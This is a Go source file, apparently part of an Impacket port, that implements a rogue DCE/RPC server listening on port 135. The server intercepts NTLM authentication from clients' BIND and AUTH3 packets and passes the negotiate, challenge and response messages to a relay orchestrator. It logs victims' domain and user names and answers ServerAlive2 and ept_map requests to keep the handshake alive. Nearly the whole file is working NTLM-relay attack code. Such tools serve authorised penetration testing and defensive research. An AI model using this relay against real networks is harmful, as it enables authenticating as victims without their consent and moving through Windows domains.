// SPDX-License-Identifier: Apache-2.0

package relay

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"

	"gopacket/internal/build"
)

// DCE/RPC packet type constants
const (
	rpcPktRequest       = 0
	rpcPktResponse      = 2
	rpcPktFault         = 3
	rpcPktBind          = 11
	rpcPktBindAck       = 12
	rpcPktBindNak       = 13
	rpcPktAlterContext  = 14
	rpcPktAlterContextR = 15
	rpcPktAuth3         = 16
)

// DCE/RPC auth types
const (
	rpcAuthNone         = 0
	rpcAuthWinNT        = 10 // RPC_C_AUTHN_WINNT (NTLMSSP)
	rpcAuthDefault      = 0xFF
	rpcAuthGSSNegotiate = 9 // SPNEGO
)

// NTLM message types
const (
	ntlmNegotiate = 1
	ntlmChallenge = 2
	ntlmAuth      = 3
)

// Bind context item result codes
const (
	rpcContResultAccept       = 0
	rpcContResultProvReject   = 2
	rpcContResultNegotiateAck = 3
)

// Bind Time Feature Negotiation UUID prefix: 6cb71c2c-9812-4540-...
var rpcBindTimeFeaturePrefix = [8]byte{0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45}

// Bitmask for Bind Time Feature Negotiation response
const rpcBindTimeFeatureBitmask = 0x03 // security context multiplexing + keep connection on orphan

// NDR64 Transfer Syntax UUID (71710533-beba-4937-8319-b5dbef9ccc36) — reject this
var rpcNDR64Syntax = [16]byte{
	0x33, 0x05, 0x71, 0x71, 0xba, 0xbe, 0x37, 0x49,
	0x83, 0x19, 0xb5, 0xdb, 0xef, 0x9c, 0xcc, 0x36,
}

// IObjectExporter UUID: 99fcfec4-5260-101b-bbcb-00aa0021347a
var rpcIIDObjectExporter = [16]byte{
	0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10,
	0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a,
}

// EPM UUID: e1af8308-5d1f-11c9-91a4-08002b14a0fa
var rpcEPMUUID = [16]byte{
	0x08, 0x83, 0xaf, 0xe1, 0x1f, 0x5d, 0xc9, 0x11,
	0x91, 0xa4, 0x08, 0x00, 0x2b, 0x14, 0xa0, 0xfa,
}

// Status codes for RPC fault/nak
const (
	rpcStatusAccessDenied    = 0x00000005
	rpcStatusNoAuth          = 0x1c010002
	rpcStatusUnsupportedType = 0x1c000013
)

// RPCRelayServer listens for incoming DCE/RPC connections on port 135
// and captures NTLM authentication from BIND/AUTH3 packets.
// Responds to IObjectExporter::ServerAlive2 and epmapper::ept_map requests
// to keep the RPC handshake flowing.
// Matches Impacket's rpcrelayserver.py.
type RPCRelayServer struct {
	listenAddr string
	listener   net.Listener
	authCh     chan<- AuthResult
}

// NewRPCRelayServer creates a new RPC relay server.
func NewRPCRelayServer(listenAddr string) *RPCRelayServer {
	return &RPCRelayServer{listenAddr: listenAddr}
}

// Start begins listening for RPC connections, implements ProtocolServer.
func (s *RPCRelayServer) Start(resultChan chan<- AuthResult) error {
	ln, err := net.Listen("tcp", s.listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", s.listenAddr, err)
	}
	s.listener = ln
	s.authCh = resultChan

	log.Printf("[*] RPC relay server listening on %s", s.listenAddr)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				if build.Debug {
					log.Printf("[D] RPC relay server: accept error: %v", err)
				}
				return
			}
			go s.handleConnection(conn)
		}
	}()

	return nil
}

// Stop closes the listener, implements ProtocolServer.
func (s *RPCRelayServer) Stop() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

// rpcCommonHeader is the 16-byte DCE/RPC common header.
type rpcCommonHeader struct {
	MajorVersion uint8
	MinorVersion uint8
	PacketType   uint8
	PacketFlags  uint8
	DataRep      [4]byte
	FragLength   uint16
	AuthLength   uint16
	CallID       uint32
}

// rpcSecTrailer is the security trailer appended to authenticated packets.
type rpcSecTrailer struct {
	AuthType     uint8
	AuthLevel    uint8
	AuthPadLen   uint8
	AuthReserved uint8
	AuthCtxID    uint32
}

// rpcContextItem represents a presentation context item in BIND/ALTER_CONTEXT.
type rpcContextItem struct {
	ContextID      uint16
	NumTransItems  uint8
	Reserved       uint8
	AbstractSyntax [20]byte // UUID (16) + Version (4)
	TransferSyntax [20]byte // UUID (16) + Version (4)
}

// rpcCtxItemResult represents a single result in BIND_ACK context result list.
type rpcCtxItemResult struct {
	Result         uint16
	Reason         uint16
	TransferSyntax [20]byte
}

func (s *RPCRelayServer) handleConnection(conn net.Conn) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()
	log.Printf("[*] RPC: Incoming connection from %s", remoteAddr)

	// State tracking
	var boundUUID [16]byte // the abstract syntax UUID that was accepted
	var authType uint8
	var authLevel uint8
	var authCtxID uint32

	for {
		// Read a full RPC PDU
		pdu, err := rpcRecvPDU(conn)
		if err != nil {
			if build.Debug {
				log.Printf("[D] RPC: connection closed from %s: %v", remoteAddr, err)
			}
			return
		}

		if len(pdu) < 16 {
			return
		}

		var hdr rpcCommonHeader
		binary.Read(bytes.NewReader(pdu[:16]), binary.LittleEndian, &hdr)

		if build.Debug {
			log.Printf("[D] RPC: packet type=%d, fragLen=%d, authLen=%d, callID=%d from %s",
				hdr.PacketType, hdr.FragLength, hdr.AuthLength, hdr.CallID, remoteAddr)
		}

		switch hdr.PacketType {
		case rpcPktBind, rpcPktAlterContext:
			// Parse bind/alter context header (4+4+4 = 12 bytes after common header)
			if len(pdu) < 28 { // 16 (common) + 12 (bind header)
				return
			}
			// maxXmitFrag := binary.LittleEndian.Uint16(pdu[16:18])
			// maxRecvFrag := binary.LittleEndian.Uint16(pdu[18:20])
			// assocGroup  := binary.LittleEndian.Uint32(pdu[20:24])
			numCtxItems := pdu[24] // number of context items (1 byte at offset 24)

			// Parse context items starting at offset 28
			// But first: the actual layout is numCtxItems(1) + reserved(3) = 4 bytes
			// so ctx items start at 16+4+4+4+4 = 28+4 = offset 28 includes numCtxItems but
			// Actually: bind body = MaxXmitFrag(2) + MaxRecvFrag(2) + AssocGroup(4) + NumCtxItems(1) + reserved(3)
			// = 12 bytes, so ctx items at offset 16+12 = 28
			ctxItemsOffset := 28
			var ctxResults []rpcCtxItemResult

			for i := 0; i < int(numCtxItems); i++ {
				off := ctxItemsOffset + i*44 // each context item is 44 bytes
				if off+44 > len(pdu)-int(hdr.AuthLength) {
					break
				}

				var item rpcContextItem
				item.ContextID = binary.LittleEndian.Uint16(pdu[off : off+2])
				item.NumTransItems = pdu[off+2]
				copy(item.AbstractSyntax[:], pdu[off+4:off+24])
				copy(item.TransferSyntax[:], pdu[off+24:off+44])

				transferUUID := item.TransferSyntax[:16]
				transferVer := binary.LittleEndian.Uint32(item.TransferSyntax[16:20])

				var result rpcCtxItemResult

				// Check for Bind Time Feature Negotiation
				if bytes.Equal(transferUUID[:8], rpcBindTimeFeaturePrefix[:]) && transferVer == 1 {
					result.Result = rpcContResultNegotiateAck
					result.Reason = rpcBindTimeFeatureBitmask
					// TransferSyntax = zeros
				} else if bytes.Equal(transferUUID, rpcNDR64Syntax[:]) {
					// Reject NDR64
					result.Result = rpcContResultProvReject
					result.Reason = 2 // proposed transfer syntaxes not supported
					// TransferSyntax = zeros
				} else {
					// Accept — this is likely NDR 2.0
					result.Result = rpcContResultAccept
					copy(result.TransferSyntax[:], item.TransferSyntax[:])
					copy(boundUUID[:], item.AbstractSyntax[:16])
				}

				ctxResults = append(ctxResults, result)
			}

			// Check for auth data
			if hdr.AuthLength > 0 {
				// Parse sec_trailer (8 bytes before auth_data)
				secTrailerOff := int(hdr.FragLength) - int(hdr.AuthLength) - 8
				if secTrailerOff < 0 || secTrailerOff+8 > len(pdu) {
					return
				}
				var sec rpcSecTrailer
				binary.Read(bytes.NewReader(pdu[secTrailerOff:secTrailerOff+8]), binary.LittleEndian, &sec)

				authType = sec.AuthType
				authLevel = sec.AuthLevel
				authCtxID = sec.AuthCtxID

				if sec.AuthType != rpcAuthWinNT && sec.AuthType != rpcAuthDefault {
					if build.Debug {
						log.Printf("[D] RPC: unsupported auth type %d from %s", sec.AuthType, remoteAddr)
					}
					// Send BIND_NAK
					resp := rpcBuildFaultOrNak(hdr, rpcPktBindNak, rpcStatusNoAuth)
					conn.Write(resp)
					return
				}

				// Extract NTLM token from auth_data
				authData := pdu[secTrailerOff+8:]
				if len(authData) < 12 {
					return
				}

				// Check if this is NTLM
				if string(authData[:7]) != "NTLMSSP" {
					if build.Debug {
						log.Printf("[D] RPC: auth data is not NTLMSSP from %s", remoteAddr)
					}
					resp := rpcBuildFaultOrNak(hdr, rpcPktBindNak, rpcStatusNoAuth)
					conn.Write(resp)
					return
				}

				msgType := binary.LittleEndian.Uint32(authData[8:12])
				if msgType == ntlmNegotiate {
					// NTLM Type 1 — relay it
					type1 := authData

					if build.Debug {
						log.Printf("[D] RPC: NTLM Type 1 (%d bytes) from %s", len(type1), remoteAddr)
					}

					// Create auth result and push to orchestrator
					auth := AuthResult{
						NTLMType1:  type1,
						SourceAddr: remoteAddr,
						ServerConn: conn,
						Type2Ch:    make(chan []byte, 1),
						Type3Ch:    make(chan []byte, 1),
						ResultCh:   make(chan bool, 1),
					}

					s.authCh <- auth

					// Wait for Type 2 challenge
					type2, ok := <-auth.Type2Ch
					if !ok || type2 == nil {
						log.Printf("[-] RPC relay: no challenge received for %s", remoteAddr)
						return
					}

					// Build BIND_ACK with Type2 in auth_data
					resp := rpcBuildBindAck(hdr, ctxResults, authType, authLevel, authCtxID, type2)
					if _, err := conn.Write(resp); err != nil {
						if build.Debug {
							log.Printf("[D] RPC: failed to send BIND_ACK to %s: %v", remoteAddr, err)
						}
						return
					}

					if build.Debug {
						log.Printf("[D] RPC: sent BIND_ACK with Type2 challenge to %s", remoteAddr)
					}

					// Now we need to wait for AUTH3 with Type3
					// Continue the loop — AUTH3 will be handled below
					// But first store the auth result for when we get AUTH3
					// We use a closure-like approach: store in a map or just handle inline

					// Read next PDU which should be AUTH3
					pdu2, err := rpcRecvPDU(conn)
					if err != nil {
						return
					}
					if len(pdu2) < 16 {
						return
					}

					var hdr2 rpcCommonHeader
					binary.Read(bytes.NewReader(pdu2[:16]), binary.LittleEndian, &hdr2)

					if hdr2.PacketType == rpcPktAuth3 {
						s.handleAuth3(conn, remoteAddr, pdu2, hdr2, auth)
					} else if hdr2.PacketType == rpcPktBind || hdr2.PacketType == rpcPktAlterContext {
						// Some clients send another BIND with auth instead of AUTH3
						if hdr2.AuthLength > 0 {
							secOff := int(hdr2.FragLength) - int(hdr2.AuthLength) - 8
							if secOff >= 0 && secOff+8 <= len(pdu2) {
								authData2 := pdu2[secOff+8:]
								if len(authData2) >= 12 && string(authData2[:7]) == "NTLMSSP" {
									mt := binary.LittleEndian.Uint32(authData2[8:12])
									if mt == ntlmAuth {
										type3 := authData2
										domain, user := extractNTLMType3Info(type3)
										log.Printf("[*] RPC: NTLM Type 3 from %s\\%s @ %s", domain, user, remoteAddr)
										auth.Type3Ch <- type3
										success := <-auth.ResultCh
										if !success {
											resp := rpcBuildFaultOrNak(hdr2, rpcPktFault, rpcStatusAccessDenied)
											conn.Write(resp)
										}
										return
									}
								}
							}
						}
					} else {
						if build.Debug {
							log.Printf("[D] RPC: expected AUTH3, got type %d from %s", hdr2.PacketType, remoteAddr)
						}
					}
					return

				} else if msgType == ntlmAuth {
					// Shouldn't get Type3 in BIND, but handle it
					if build.Debug {
						log.Printf("[D] RPC: unexpected NTLM Type3 in BIND from %s", remoteAddr)
					}
					return
				}

			} else {
				// No auth in BIND — respond with BIND_ACK (no auth) and wait for auth later
				if build.Debug {
					log.Printf("[D] RPC: BIND with no auth from %s, sending BIND_ACK", remoteAddr)
				}
				resp := rpcBuildBindAck(hdr, ctxResults, 0, 0, 0, nil)
				conn.Write(resp)
				continue
			}

		case rpcPktAuth3:
			// AUTH3 carries the NTLM Type3 — but we should have handled this inline above
			if build.Debug {
				log.Printf("[D] RPC: unexpected standalone AUTH3 from %s", remoteAddr)
			}
			return

		case rpcPktRequest:
			// RPC REQUEST — answer IObjectExporter::ServerAlive2 or epmapper::ept_map
			resp := s.handleRequest(pdu, hdr, boundUUID, remoteAddr)
			if resp != nil {
				conn.Write(resp)
			}

		default:
			if build.Debug {
				log.Printf("[D] RPC: unsupported packet type %d from %s", hdr.PacketType, remoteAddr)
			}
			resp := rpcBuildFaultOrNak(hdr, rpcPktFault, rpcStatusUnsupportedType)
			conn.Write(resp)
			return
		}
	}
}

// handleAuth3 processes an AUTH3 packet containing the NTLM Type3.
func (s *RPCRelayServer) handleAuth3(conn net.Conn, remoteAddr string, pdu []byte, hdr rpcCommonHeader, auth AuthResult) {
	if hdr.AuthLength == 0 {
		log.Printf("[-] RPC: AUTH3 with no auth data from %s", remoteAddr)
		auth.ResultCh <- false
		return
	}

	secTrailerOff := int(hdr.FragLength) - int(hdr.AuthLength) - 8
	if secTrailerOff < 0 || secTrailerOff+8 > len(pdu) {
		auth.ResultCh <- false
		return
	}

	authData := pdu[secTrailerOff+8:]
	if len(authData) < 12 || string(authData[:7]) != "NTLMSSP" {
		log.Printf("[-] RPC: AUTH3 auth data is not NTLMSSP from %s", remoteAddr)
		auth.ResultCh <- false
		return
	}

	msgType := binary.LittleEndian.Uint32(authData[8:12])
	if msgType != ntlmAuth {
		log.Printf("[-] RPC: AUTH3 expected Type3, got type %d from %s", msgType, remoteAddr)
		auth.ResultCh <- false
		return
	}

	type3 := authData
	domain, user := extractNTLMType3Info(type3)

	if user == "" {
		log.Printf("[!] RPC: empty username from %s — anonymous login", remoteAddr)
		auth.ResultCh <- false
		return
	}

	log.Printf("[*] RPC: NTLM Type 3 from %s\\%s @ %s", domain, user, remoteAddr)

	// Send Type 3 to orchestrator
	auth.Type3Ch <- type3

	// Wait for result
	success := <-auth.ResultCh
	if !success {
		resp := rpcBuildFaultOrNak(rpcCommonHeader{
			MajorVersion: 5,
			PacketType:   rpcPktFault,
			DataRep:      hdr.DataRep,
			CallID:       hdr.CallID,
		}, rpcPktFault, rpcStatusAccessDenied)
		conn.Write(resp)
	}
	// AUTH3 has no response on success per the spec
}

// handleRequest handles RPC REQUEST packets by dispatching based on bound UUID + opnum.
func (s *RPCRelayServer) handleRequest(pdu []byte, hdr rpcCommonHeader, boundUUID [16]byte, remoteAddr string) []byte {
	if len(pdu) < 24 { // 16 (common) + 8 (request header)
		return nil
	}

	// Request header: AllocHint(4) + ContextID(2) + OpNum(2)
	opNum := binary.LittleEndian.Uint16(pdu[22:24])

	if build.Debug {
		log.Printf("[D] RPC: REQUEST opnum=%d, boundUUID=%x from %s", opNum, boundUUID, remoteAddr)
	}

	// IObjectExporter::ServerAlive2 (opnum 5)
	if boundUUID == rpcIIDObjectExporter && opNum == 5 {
		return s.buildServerAlive2Response(hdr)
	}

	// epmapper::ept_map (opnum 3)
	if boundUUID == rpcEPMUUID && opNum == 3 {
		return s.buildEptMapResponse(pdu, hdr)
	}

	// Unknown — send fault
	return rpcBuildFaultOrNak(hdr, rpcPktFault, rpcStatusAccessDenied)
}

// buildServerAlive2Response builds an IObjectExporter::ServerAlive2 response.
// Returns a DUALSTRINGARRAY with TCP string bindings.
func (s *RPCRelayServer) buildServerAlive2Response(hdr rpcCommonHeader) []byte {
	// Build DUALSTRINGARRAY: string bindings + security bindings
	// String binding: [wTowerId(2)][aNetworkAddr(null-terminated UTF-8)]
	// Security binding: [wAuthnSvc(2)][wAuthzSvc(2)][aPrincName(null-terminated)]

	// TCP binding: tower ID = 0x07 (TCP/IP)
	var dsaBuf bytes.Buffer

	// String bindings
	dsaBuf.WriteByte(0x07) // TOWERID_DOD_TCP
	dsaBuf.WriteByte(0x00) // high byte (written as ushort later)
	dsaBuf.WriteString("127.0.0.1")
	dsaBuf.WriteByte(0x00) // null terminator
	// Padding to even boundary
	if dsaBuf.Len()%2 != 0 {
		dsaBuf.WriteByte(0x00)
	}
	wSecurityOffset := dsaBuf.Len()

	// Security bindings
	dsaBuf.WriteByte(byte(rpcAuthWinNT)) // wAuthnSvc
	dsaBuf.WriteByte(0x00)
	dsaBuf.WriteByte(0xff) // wAuthzSvc (should be 0xffff but packed as ushort)
	dsaBuf.WriteByte(0x00)
	dsaBuf.WriteByte(0x00) // empty aPrincName
	// Padding
	if dsaBuf.Len()%2 != 0 {
		dsaBuf.WriteByte(0x00)
	}

	dsaData := dsaBuf.Bytes()

	// Build response body:
	// ppdsaOrBindings: wNumEntries(2) + wSecurityOffset(2) + aStringArray(...)
	// COMVERSION: MajorVersion(2)=5 + MinorVersion(2)=7
	// Reserved(4)=0
	var body bytes.Buffer
	// COMVERSION
	binary.Write(&body, binary.LittleEndian, uint16(5)) // major
	binary.Write(&body, binary.LittleEndian, uint16(7)) // minor
	// Reserved
	binary.Write(&body, binary.LittleEndian, uint32(0))
	// DUALSTRINGARRAY
	binary.Write(&body, binary.LittleEndian, uint16(len(dsaData)/2))    // wNumEntries (in wchar_t units)
	binary.Write(&body, binary.LittleEndian, uint16(wSecurityOffset/2)) // wSecurityOffset
	body.Write(dsaData)
	// HRESULT
	binary.Write(&body, binary.LittleEndian, uint32(0)) // S_OK

	return rpcBuildResponse(hdr, body.Bytes())
}

// buildEptMapResponse reflects the request tower back (matches Impacket behavior).
func (s *RPCRelayServer) buildEptMapResponse(pdu []byte, hdr rpcCommonHeader) []byte {
	// Simplified: return empty tower array with status=0
	// The key goal is to not crash and keep the connection going

	var body bytes.Buffer

	// entry_handle: context_handle_attributes(4) + context_handle_uuid(16)
	binary.Write(&body, binary.LittleEndian, uint32(0))
	body.Write(make([]byte, 16))

	// num_towers = 0
	binary.Write(&body, binary.LittleEndian, uint32(0))
	// ITowers max_count = 0
	binary.Write(&body, binary.LittleEndian, uint32(0))
	// status = 0
	binary.Write(&body, binary.LittleEndian, uint32(0))

	return rpcBuildResponse(hdr, body.Bytes())
}

// rpcRecvPDU reads a complete DCE/RPC PDU from the connection.
func rpcRecvPDU(conn net.Conn) ([]byte, error) {
	// Read 16-byte common header first
	hdrBuf := make([]byte, 16)
	if _, err := io.ReadFull(conn, hdrBuf); err != nil {
		return nil, err
	}

	// FragLength at offset 8 (2 bytes, little-endian)
	fragLen := int(binary.LittleEndian.Uint16(hdrBuf[8:10]))
	if fragLen < 16 {
		return nil, fmt.Errorf("invalid frag length: %d", fragLen)
	}
	if fragLen > 65536 {
		return nil, fmt.Errorf("frag length too large: %d", fragLen)
	}

	// Read the rest
	pdu := make([]byte, fragLen)
	copy(pdu[:16], hdrBuf)
	if fragLen > 16 {
		if _, err := io.ReadFull(conn, pdu[16:]); err != nil {
			return nil, err
		}
	}

	return pdu, nil
}

// rpcBuildBindAck constructs a BIND_ACK or ALTER_CONTEXT_RESP with optional NTLM challenge.
func rpcBuildBindAck(reqHdr rpcCommonHeader, ctxResults []rpcCtxItemResult, authType, authLevel uint8, authCtxID uint32, challengeData []byte) []byte {
	var buf bytes.Buffer

	// Determine response packet type
	respType := uint8(rpcPktBindAck)
	if reqHdr.PacketType == rpcPktAlterContext {
		respType = rpcPktAlterContextR
	}

	// PDU data (bind_ack body):
	// MaxXmitFrag(2) + MaxRecvFrag(2) + AssocGroup(4) + SecondaryAddr(variable) + CtxResults

	var pduData bytes.Buffer
	binary.Write(&pduData, binary.LittleEndian, uint16(4280))       // max_xmit_frag
	binary.Write(&pduData, binary.LittleEndian, uint16(4280))       // max_recv_frag
	binary.Write(&pduData, binary.LittleEndian, uint32(0x12345678)) // assoc_group

	// Secondary address (port string): "9999\0" padded to 4-byte boundary
	secondaryAddr := "9999"
	binary.Write(&pduData, binary.LittleEndian, uint16(len(secondaryAddr)+1))
	pduData.WriteString(secondaryAddr)
	pduData.WriteByte(0) // null terminator
	// Pad to 4-byte alignment
	for pduData.Len()%4 != 0 {
		pduData.WriteByte(0)
	}

	// Context result list
	pduData.WriteByte(byte(len(ctxResults))) // num results
	pduData.WriteByte(0)                     // reserved
	pduData.WriteByte(0)                     // reserved
	pduData.WriteByte(0)                     // reserved

	for _, r := range ctxResults {
		binary.Write(&pduData, binary.LittleEndian, r.Result)
		binary.Write(&pduData, binary.LittleEndian, r.Reason)
		pduData.Write(r.TransferSyntax[:])
	}

	pduBody := pduData.Bytes()

	// Build security trailer + auth data if present
	var secTrailerBytes []byte
	var authDataBytes []byte
	authLen := uint16(0)

	if challengeData != nil && len(challengeData) > 0 {
		// Add padding to align to 4-byte boundary
		pad := (4 - (len(pduBody) % 4)) % 4
		if pad > 0 {
			padBytes := make([]byte, pad)
			for i := range padBytes {
				padBytes[i] = 0xFF
			}
			pduBody = append(pduBody, padBytes...)
		}

		// Build sec_trailer
		var secBuf bytes.Buffer
		secBuf.WriteByte(authType)                            // auth_type
		secBuf.WriteByte(authLevel)                           // auth_level
		secBuf.WriteByte(byte(pad))                           // auth_pad_len
		secBuf.WriteByte(0)                                   // reserved
		binary.Write(&secBuf, binary.LittleEndian, authCtxID) // auth_ctx_id
		secTrailerBytes = secBuf.Bytes()

		authDataBytes = challengeData
		authLen = uint16(len(authDataBytes))
	}

	// Build the full packet
	fragLen := 16 + len(pduBody) + len(secTrailerBytes) + len(authDataBytes)

	// Write common header
	binary.Write(&buf, binary.LittleEndian, uint8(5))           // major version
	binary.Write(&buf, binary.LittleEndian, uint8(0))           // minor version
	binary.Write(&buf, binary.LittleEndian, respType)           // packet type
	binary.Write(&buf, binary.LittleEndian, reqHdr.PacketFlags) // flags
	buf.Write(reqHdr.DataRep[:])                                // data rep
	binary.Write(&buf, binary.LittleEndian, uint16(fragLen))    // frag_length
	binary.Write(&buf, binary.LittleEndian, authLen)            // auth_length
	binary.Write(&buf, binary.LittleEndian, reqHdr.CallID)      // call_id

	// PDU body
	buf.Write(pduBody)

	// Sec trailer + auth data
	if secTrailerBytes != nil {
		buf.Write(secTrailerBytes)
		buf.Write(authDataBytes)
	}

	return buf.Bytes()
}

// rpcBuildResponse constructs a DCE/RPC RESPONSE packet.
func rpcBuildResponse(reqHdr rpcCommonHeader, stubData []byte) []byte {
	var buf bytes.Buffer

	fragLen := uint16(16 + 8 + len(stubData)) // common header + response header + stub

	// Common header
	binary.Write(&buf, binary.LittleEndian, uint8(5))              // major
	binary.Write(&buf, binary.LittleEndian, uint8(0))              // minor
	binary.Write(&buf, binary.LittleEndian, uint8(rpcPktResponse)) // type
	binary.Write(&buf, binary.LittleEndian, uint8(0x03))           // flags: first+last
	buf.Write(reqHdr.DataRep[:])
	binary.Write(&buf, binary.LittleEndian, fragLen)
	binary.Write(&buf, binary.LittleEndian, uint16(0)) // auth_length
	binary.Write(&buf, binary.LittleEndian, reqHdr.CallID)

	// Response header
	binary.Write(&buf, binary.LittleEndian, uint32(len(stubData))) // alloc_hint
	binary.Write(&buf, binary.LittleEndian, uint16(0))             // context_id
	binary.Write(&buf, binary.LittleEndian, uint8(0))              // cancel_count
	binary.Write(&buf, binary.LittleEndian, uint8(0))              // reserved

	// Stub data
	buf.Write(stubData)

	return buf.Bytes()
}

// rpcBuildFaultOrNak builds a FAULT or BIND_NAK response with the given status code.
func rpcBuildFaultOrNak(reqHdr rpcCommonHeader, pktType uint8, status uint32) []byte {
	var buf bytes.Buffer

	statusBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(statusBytes, status)

	fragLen := uint16(16 + 4) // common header + status

	binary.Write(&buf, binary.LittleEndian, uint8(5))
	binary.Write(&buf, binary.LittleEndian, uint8(0))
	binary.Write(&buf, binary.LittleEndian, pktType)
	binary.Write(&buf, binary.LittleEndian, uint8(0x03)) // first+last
	buf.Write(reqHdr.DataRep[:])
	binary.Write(&buf, binary.LittleEndian, fragLen)
	binary.Write(&buf, binary.LittleEndian, uint16(0))
	binary.Write(&buf, binary.LittleEndian, reqHdr.CallID)
	buf.Write(statusBytes)

	return buf.Bytes()
}
